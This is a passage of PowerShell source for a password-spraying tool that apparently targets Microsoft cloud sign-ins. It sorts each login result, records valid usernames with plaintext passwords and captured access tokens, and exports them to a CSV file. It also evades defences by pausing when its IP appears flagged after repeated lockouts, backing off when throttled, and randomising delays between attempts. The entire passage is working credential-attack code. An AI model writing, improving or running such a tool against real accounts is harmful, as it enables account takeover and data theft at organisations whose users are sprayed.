                    $stats.ErrorsByCategory[$cat] = ($stats.ErrorsByCategory[$cat] ?? 0) + 1

                    $resultParams = @{
                        Category = $cat;
                        User = $normalizedUser;
                        Password = $password;
                        Details = $result.ErrorDetails;
                        App = $app
                    }

                    switch -Regex ($cat) {
                        '^ValidCredentials|^Success' {
                            $credRecord = @{
                                Username   = $user;
                                NormalizedUsername = $normalizedUser;
                                Password = $password
                                Application = $app.Name;
                                ClientId = $app.ClientId;
                                Resource = $app.Resource
                                Category = $cat;
                                Message = $result.ErrorDetails.Message;
                                ErrorCode = $result.ErrorDetails.ErrorCode
                                Timestamp = $result.ErrorDetails.Timestamp
                                AccessToken = $(if ($cat -eq 'Success') { $result.Response.access_token } else { $null })
                            }
                            $stats.ValidCredentials.Add([PSCustomObject]$credRecord)
                            Show-Result -Params $resultParams
                        }
                        'AccountLocked' {
                            $stats.AccountLocked++; $lockoutCount++; $consecutiveLockouts++
                            Show-Result -Params $resultParams
                            
                            # Early lockout detection - if 3+ consecutive lockouts, IP is likely flagged
                            if ($consecutiveLockouts -ge 3) {
                                Write-Log "DETECTED: IP reputation likely flagged (${consecutiveLockouts} consecutive lockouts)" -Type Error
                                Write-Log "Emergency cooldown: ${BatchCooldown}s..." -Type Warning
                                $consecutiveLockouts = 0
                                Start-Sleep -Seconds $BatchCooldown
                                Write-Log "Resuming after cooldown..." -Type Info
                            }
                            
                            if ($lockoutCount -ge $script:Config.LockoutThreshold) { Write-Log "CRITICAL: Threshold reached" -Type Error }
                        }
                        'Throttled' {
                            $stats.Throttled++; $consecutiveThrottles++
                            $wait = [Math]::Min(300, 30 * $consecutiveThrottles)
                            Write-Log "THROTTLED: Waiting ${wait}s..." -Type Warning
                            Start-Sleep -Seconds $wait
                        }
                        'InvalidCredentials'     { $stats.InvalidCredentials++; $consecutiveLockouts = 0 }
                        'UserNotFound'           { $stats.UserNotFound++; $consecutiveLockouts = 0 }
                        'AccountDisabled'        { $stats.AccountDisabled++; $consecutiveLockouts = 0; Show-Result -Params $resultParams }
                        'ConditionalAccessBlocked' { $stats.ConditionalAccessBlocked++; $consecutiveLockouts = 0; Show-Result -Params $resultParams }
                        'TenantNotFound' { 
                            $stats.TenantNotFound++
                            Show-Result -Params $resultParams
                            if (-not $ContinueOnTenantError) { $result.ErrorDetails.Action = 'Stop' }
                        }
                        default { $stats.UnknownErrors++ }
                    }

                    if ($cat -ne 'Throttled') { $consecutiveThrottles = 0 }

                    # Delay between users
                    if (-not $NoDelay) {
                        $delay = if ($DelayBetweenUsers -gt 0) { [Math]::Max(1, $DelayBetweenUsers + (Get-Random -Min -2 -Max 3)) } else { (Get-Random -Min 1 -Max 3) }
                        Start-Sleep -Seconds $delay
                    }

                    if ($result.ErrorDetails.Action -eq 'Stop') { Write-Host "`r$(' ' * 90)`r" -NoNewline; Write-Log "Critical error. Stopping." -Type Error; break }
                    if (($stats.InvalidCredentials + $stats.UnknownErrors) -ge $MaxFailures) { Write-Host "`r$(' ' * 90)`r" -NoNewline; Write-Log "Max failures reached." -Type Warning; break }
                }
                
                # Clear progress line and show round summary
                Write-Host "`r$(' ' * 90)`r" -NoNewline
                $roundStats = @("Valid=$($stats.ValidCredentials.Count)")
                if ($stats.InvalidCredentials -gt 0) { $roundStats += "Invalid=$($stats.InvalidCredentials)" }
                if ($stats.AccountLocked -gt 0) { $roundStats += "Locked=$($stats.AccountLocked)" }
                Write-Log "Round $($stats.SprayRounds): $($roundStats -join ' ')"
            }

            Write-Banner "SPRAY RESULTS   "
            
            $duration = [Math]::Round(((Get-Date) - $stats.StartTime).TotalMinutes, 1)
            Write-Log "Completed in $duration minutes"
            Write-Log "Valid Credentials: $($stats.ValidCredentials.Count)" -Type Success
            $stats.ValidCredentials | ForEach-Object { Write-Log "$($_.NormalizedUsername) : $($_.Password)" -Type Detail }

            # Export to CSV
            if ($stats.ValidCredentials.Count -gt 0) {
                $csvPath = "ValidCredentials_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv"
                $csvColumns = @(
                    @{N='Timestamp';E={$_.Timestamp}}, @{N='Username';E={$_.NormalizedUsername}}, 'Password',
                    'Application', 'Resource', 'ErrorCode', @{N='Details';E={$_.Message}}, 'AccessToken'
                )
                $stats.ValidCredentials | Select-Object $csvColumns | Export-Csv -Path $csvPath -NoTypeInformation
                Write-Log "Exported to: $csvPath" -Type Success
            }

            # Stats summary with color mapping - only show non-zero values
            $statColors = @{ InvalidCredentials='Info'; AccountLocked='Error'; AccountDisabled='Warning'; ConditionalAccessBlocked='Warning'; Throttled='Warning'; TenantNotFound='Error'; UnknownErrors='Error' }
            $summaryParts = @("Attempts=$($stats.TotalAttempts)")
            $statColors.Keys | Where-Object { $stats[$_] -gt 0 } | ForEach-Object { $summaryParts += "$_=$($stats[$_])" }
            Write-Log "Stats: $($summaryParts -join ' | ')"
            
            Write-Host ("`n" + "═" * 70) -ForegroundColor Cyan
            
            # Return filtered stats - remove zero values and internal tracking
            $filteredStats = @{
                ValidCredentials = $stats.ValidCredentials
                TotalAttempts    = $stats.TotalAttempts
                SprayRounds      = $stats.SprayRounds
                Duration         = [Math]::Round(((Get-Date) - $stats.StartTime).TotalMinutes, 1)
            }
            # Add only non-zero counters
            @('InvalidCredentials', 'AccountLocked', 'AccountDisabled', 'UserNotFound', 
              'TenantNotFound', 'ConditionalAccessBlocked', 'Throttled', 'UnknownErrors') | 
                Where-Object { $stats[$_] -gt 0 } | 
                ForEach-Object { $filteredStats[$_] = $stats[$_] }
            
            return $filteredStats

        } catch { Write-Log "Error: $_" -Type Error; throw }
    }
}
